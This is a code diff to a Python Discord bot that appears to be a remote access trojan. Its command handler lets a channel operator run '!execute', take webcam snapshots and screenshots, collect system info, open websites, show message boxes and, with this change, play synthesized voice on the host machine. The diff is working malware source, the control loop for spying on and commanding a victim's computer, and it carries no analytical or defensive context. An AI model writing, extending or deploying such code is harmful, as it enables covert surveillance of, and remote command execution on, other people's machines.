@@ -8,6 +8,7 @@ from laozi.payloads.screenshot import get_screenshot
 from laozi.payloads.webcam import get_webcam_snapshot
 from laozi.payloads.website import open_website
 from laozi.payloads.messagebox import display_messagebox
+from laozi.payloads.voice import play_voice
 
 
 def load_environment_variables(file_path="../.env"):
@@ -33,7 +34,8 @@ class DiscordBotClient(discord.Client):
                 "!screenshot             -> Take a screenshot",
                 "!sysinfo                -> Get system information",
                 "!webcam                 -> Get webcam snapshot",
-                "!website     <url>      -> Open a website"
+                "!website     <url>      -> Open a website",
+                "!voice       <text>     -> Read text out loud",
             ]
             command_text = "\n".join(sorted(commands))
             await channel.send(f"@everyone Hello!\nHere are the available commands:\n```{command_text}```")
@@ -53,15 +55,22 @@ class DiscordBotClient(discord.Client):
             "!website": open_website,
             "!webcam": self.handle_webcam_snapshot,
             "!screenshot": self.handle_screenshot,
+            "!voice": play_voice,
         }
 
         handler = commands.get(command)
-        only_one_arg = ["!execute", "!alert", "!website"]
+        has_param = ["!execute", "!alert", "!website", "!voice"]
+
         if handler:
-            if command in only_one_arg:
-                handler(args)
+            if command in has_param:
+                if not args:
+                    await message.channel.send(f"Usage: `{command} <parameter>`")
+                else:
+                    handler(args)
             else:
                 await handler(message.channel, args)
+        elif command.startswith("!"):
+            await message.channel.send(f"Unknown command: `{command}`.")
 
     async def handle_system_info(self, channel, _):
         sys_info = get_sys_info()
